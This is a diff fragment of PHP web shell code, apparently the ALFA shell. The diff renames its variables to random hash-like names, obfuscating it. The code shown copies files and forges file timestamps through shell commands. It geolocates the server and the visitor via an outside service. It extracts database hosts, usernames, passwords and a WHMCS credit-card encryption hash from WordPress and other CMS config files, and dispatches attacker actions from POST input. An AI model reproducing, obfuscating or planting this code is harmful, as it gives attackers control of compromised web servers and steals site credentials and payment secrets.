 		if(is_file($_POST["alfa1"])){
 			@copy($_POST["alfa1"], $_POST["alfa2"]);
@@ -6325,19 +6398,19 @@ function alfadoActions(){
 			if(!is_dir($_POST["alfa2"])){
 				mkdir($_POST["alfa2"], 0755, true);
 			}
-			copy_paste($dir, $name , $_POST["alfa2"] . "/");
+			copy_paste($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $kkkpgnftb068931cc450442b63f5b3d276ea4297 , $_POST["alfa2"] . "/");
 			echo("done");
 		}
-	}elseif($action == "modify"){
+	}elseif($psxclsvx418c5509e2171d55b0aee5c2ea4442b5 == "modify"){
 		if( !empty($_POST['alfa1']) ) {
-			$time = strtotime($_POST['alfa1']);
-			if($time){
-				$touched = false;
-				if($chdir_fals&&$alfa_canruncmd){
+			$ouidxbfr07cc694b9b3fc636710fa08b6922c42b = strtotime($_POST['alfa1']);
+			if($ouidxbfr07cc694b9b3fc636710fa08b6922c42b){
+				$xehyltdw62698b8ff9e416d9a7ac0fb3bd548b96 = false;
+				if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
 					alfaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa1']))."' '".addslashes($_POST['alfa2'])."'");
-					$touched = true;
+					$xehyltdw62698b8ff9e416d9a7ac0fb3bd548b96 = true;
 				}
-				if(!@touch($_POST['alfa2'],$time,$time)&&!$touched){
+				if(!@touch($_POST['alfa2'],$ouidxbfr07cc694b9b3fc636710fa08b6922c42b,$ouidxbfr07cc694b9b3fc636710fa08b6922c42b)&&!$xehyltdw62698b8ff9e416d9a7ac0fb3bd548b96){
 					echo 'no';
 				}else{
 					echo 'ok';
@@ -6350,31 +6423,31 @@ function alfadoActions(){
 
 }
 function alfaget_flags(){
-	$flags = array();
+	$btjhezuc4e5868d676cb634aa75b125a0f741abf = array();
 	if(function_exists("curl_version")){
-		$curl = new AlfaCURL();
-		$server_addr = (!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]);
-		$flag = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $server_addr);
-		$flag2 = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $_SERVER["REMOTE_ADDR"]);
-		if(strpos($flag2, "geoplugin") != false){
-			$flag = json_decode($flag, true);
-			$flag2 = json_decode($flag2, true);
-			if(!empty($flag['geoplugin_countryCode'])){
-				$flags["server"]["name"] = $flag['geoplugin_countryName'];
-				$flags["server"]["code"] = $flag['geoplugin_countryCode'];
+		$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = new AlfaCURL();
+		$lfqsgloff852bcfb643fb2f46f84ae14b507d1d7 = (!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]);
+		$xlnoekmy327a6c4304ad5938eaf0efb6cc3e53dc = $qqhrnrcwf6e57c9de709e45feb0d955351f53548->Send("http://www.geoplugin.net/json.gp?ip=" . $lfqsgloff852bcfb643fb2f46f84ae14b507d1d7);
+		$tylejkbh9a48ddad2656385fce58af47a0ef56cf = $qqhrnrcwf6e57c9de709e45feb0d955351f53548->Send("http://www.geoplugin.net/json.gp?ip=" . $_SERVER["REMOTE_ADDR"]);
+		if(strpos($tylejkbh9a48ddad2656385fce58af47a0ef56cf, "geoplugin") != false){
+			$xlnoekmy327a6c4304ad5938eaf0efb6cc3e53dc = json_decode($xlnoekmy327a6c4304ad5938eaf0efb6cc3e53dc, true);
+			$tylejkbh9a48ddad2656385fce58af47a0ef56cf = json_decode($tylejkbh9a48ddad2656385fce58af47a0ef56cf, true);
+			if(!empty($xlnoekmy327a6c4304ad5938eaf0efb6cc3e53dc['geoplugin_countryCode'])){
+				$btjhezuc4e5868d676cb634aa75b125a0f741abf["server"]["name"] = $xlnoekmy327a6c4304ad5938eaf0efb6cc3e53dc['geoplugin_countryName'];
+				$btjhezuc4e5868d676cb634aa75b125a0f741abf["server"]["code"] = $xlnoekmy327a6c4304ad5938eaf0efb6cc3e53dc['geoplugin_countryCode'];
 			}
-			if(!empty($flag2['geoplugin_countryCode'])){
-				$flags["client"]["name"] = $flag2['geoplugin_countryName'];
-				$flags["client"]["code"] = $flag2['geoplugin_countryCode'];
+			if(!empty($tylejkbh9a48ddad2656385fce58af47a0ef56cf['geoplugin_countryCode'])){
+				$btjhezuc4e5868d676cb634aa75b125a0f741abf["client"]["name"] = $tylejkbh9a48ddad2656385fce58af47a0ef56cf['geoplugin_countryName'];
+				$btjhezuc4e5868d676cb634aa75b125a0f741abf["client"]["code"] = $tylejkbh9a48ddad2656385fce58af47a0ef56cf['geoplugin_countryCode'];
 			}
 		}
 	}
-	echo json_encode($flags);
+	echo json_encode($btjhezuc4e5868d676cb634aa75b125a0f741abf);
 }
 function alfaGetConfig(){
-$cms = $_POST['alfa1'];
-$path = trim($_POST['alfa2']);
-$config = array(
+$enqiaukc570d99e4c85914470d914170d1e95144 = $_POST['alfa1'];
+$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = trim($_POST['alfa2']);
+$yzrzmzyl2245023265ae4cf87d02c8b6ba991139 = array(
 'wp'=>array('file'=>'/wp-config.php',
 'host'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
 'dbname'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_NAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
@@ -6446,74 +6519,74 @@ $config = array(
 'prefix'=>array("/config\['database'\]\['table_prefix'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
 )
 );
-if($cms == "drupal"){
-	$file = $config[$cms]['file'];
-	$file=$path.$file;
-	if(@is_file($file)||_alfa_is_dir($file,"-e")){
+if($enqiaukc570d99e4c85914470d914170d1e95144 == "drupal"){
+	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['file'];
+	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac;
+	if(@is_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)||_alfa_is_dir($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,"-e")){
 	}else{
-		$cms = 'drupal2';
+		$enqiaukc570d99e4c85914470d914170d1e95144 = 'drupal2';
 	}
 }
-if($cms == "vb"){
-	$file = $config[$cms]['file'];
-	$file=$path.$file;
-	if(@is_file($file)||_alfa_is_dir($file,"-e")){
+if($enqiaukc570d99e4c85914470d914170d1e95144 == "vb"){
+	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['file'];
+	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac;
+	if(@is_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)||_alfa_is_dir($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,"-e")){
 	}else{
-		$path .= '/core';
+		$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 .= '/core';
 	}
 }
-$data = array();
-$srch_host = $config[$cms]['host'][0];
-$srch_user = $config[$cms]['dbuser'][0];
-$srch_name = $config[$cms]['dbname'][0];
-$srch_pw = $config[$cms]['dbpw'][0];
-$prefix = $config[$cms]['prefix'][0];
-$file = $config[$cms]['file'];
-$chost = $config[$cms]['host'][1];
-$cuser = $config[$cms]['dbuser'][1];
-$cname = $config[$cms]['dbname'][1];
-$cpw = $config[$cms]['dbpw'][1];
-$cprefix = $config[$cms]['prefix'][1];
-if(@is_dir($path)||_alfa_is_dir($path)){
-$file=$path.$file;
-}elseif(@is_file($path)||_alfa_is_dir($path,"-e")){
-$file=$path;
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc = array();
+$hnsrclypbac4adc173a3745efc2f4939b713c346 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['host'][0];
+$wurzeofr2b31720dca23b9925c82172fcca3bf68 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['dbuser'][0];
+$sgdziobb2f9a8ec9a4fffa394b623ff8505011d4 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['dbname'][0];
+$mghngesfcb7772f374ec9559947e11d9f01e9b5f = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['dbpw'][0];
+$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['prefix'][0];
+$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['file'];
+$stlzgltg88721ba1e1ed952bb5bcf6664faefcd0 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['host'][1];
+$khakmwfef858b35cb8b1ad3bdf07222ee8c8c6c5 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['dbuser'][1];
+$cwpcfkkr056301054c43f8bbea2090debfec16b1 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['dbname'][1];
+$mcncodcweb1b24702ab3af352eae9a67ef953b9c = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['dbpw'][1];
+$trggwmuid05ec7e9b90a30f9d7a4d2626a4f48a5 = $yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['prefix'][1];
+if(@is_dir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485)||_alfa_is_dir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485)){
+$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac;
+}elseif(@is_file($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485)||_alfa_is_dir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,"-e")){
+$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
 }else{
 return false;
 }
-$file = __read_file($file);
-if($cms == "drupal2"){
-	$file = preg_replace("/\@code(.*?)\@endcode/s", "", $file);
-}elseif($cms == "vb"){
-	$file = preg_replace("/right of the(.*?)BAD!/s", "", $file);
+$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = __read_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
+if($enqiaukc570d99e4c85914470d914170d1e95144 == "drupal2"){
+	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = preg_replace("/\@code(.*?)\@endcode/s", "", $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
+}elseif($enqiaukc570d99e4c85914470d914170d1e95144 == "vb"){
+	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = preg_replace("/right of the(.*?)BAD!/s", "", $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
 }
-if(preg_match($srch_host, $file, $mach)){
-$data['host'] = $mach[$chost];
+if(preg_match($hnsrclypbac4adc173a3745efc2f4939b713c346, $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $osskmrcp73b5ac0111d26c2c149c563e8c027aab)){
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc['host'] = $osskmrcp73b5ac0111d26c2c149c563e8c027aab[$stlzgltg88721ba1e1ed952bb5bcf6664faefcd0];
 }
-if(preg_match($srch_user, $file, $mach)){
-$data['user'] = $mach[$cuser];
+if(preg_match($wurzeofr2b31720dca23b9925c82172fcca3bf68, $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $osskmrcp73b5ac0111d26c2c149c563e8c027aab)){
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc['user'] = $osskmrcp73b5ac0111d26c2c149c563e8c027aab[$khakmwfef858b35cb8b1ad3bdf07222ee8c8c6c5];
 }
-if(preg_match($srch_name, $file, $mach)){
-$data['dbname'] = $mach[$cname];
+if(preg_match($sgdziobb2f9a8ec9a4fffa394b623ff8505011d4, $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $osskmrcp73b5ac0111d26c2c149c563e8c027aab)){
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc['dbname'] = $osskmrcp73b5ac0111d26c2c149c563e8c027aab[$cwpcfkkr056301054c43f8bbea2090debfec16b1];
 }
-if(preg_match($srch_pw, $file, $mach)){
-$data['password'] = $mach[$cpw];
+if(preg_match($mghngesfcb7772f374ec9559947e11d9f01e9b5f, $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $osskmrcp73b5ac0111d26c2c149c563e8c027aab)){
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc['password'] = $osskmrcp73b5ac0111d26c2c149c563e8c027aab[$mcncodcweb1b24702ab3af352eae9a67ef953b9c];
 }
-if(isset($prefix)){
-if(preg_match($prefix, $file, $mach)){
-$data['prefix'] = $mach[$cprefix];
-}
-}
-if($cms=='whmcs'){
-if(preg_match($config[$cms]['cc_encryption_hash'][0], $file, $mach)){
-$data['cc_encryption_hash'] = $mach[3];
+if(isset($unkkdhum851f5ac9941d720844d143ed9cfcf60a)){
+if(preg_match($unkkdhum851f5ac9941d720844d143ed9cfcf60a, $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $osskmrcp73b5ac0111d26c2c149c563e8c027aab)){
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc['prefix'] = $osskmrcp73b5ac0111d26c2c149c563e8c027aab[$trggwmuid05ec7e9b90a30f9d7a4d2626a4f48a5];
 }
 }
-echo json_encode($data);
+if($enqiaukc570d99e4c85914470d914170d1e95144=='whmcs'){
+if(preg_match($yzrzmzyl2245023265ae4cf87d02c8b6ba991139[$enqiaukc570d99e4c85914470d914170d1e95144]['cc_encryption_hash'][0], $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $osskmrcp73b5ac0111d26c2c149c563e8c027aab)){
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc['cc_encryption_hash'] = $osskmrcp73b5ac0111d26c2c149c563e8c027aab[3];
+}
+}
+echo json_encode($sfmsaibm8d777f385d3dfec8815d20f7496026dc);
 }
 if(empty($_POST['a']))
-if(isset($default_action) && function_exists('alfa' . $default_action))
-$_POST['a'] = $default_action;
+if(isset($qsvrxdva707d47ef3e8b55054789cb477a5e0c0f) && function_exists('alfa' . $qsvrxdva707d47ef3e8b55054789cb477a5e0c0f))
+$_POST['a'] = $qsvrxdva707d47ef3e8b55054789cb477a5e0c0f;
 else
 $_POST['a'] = 'FilesMan2';//'FilesMan';
 if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
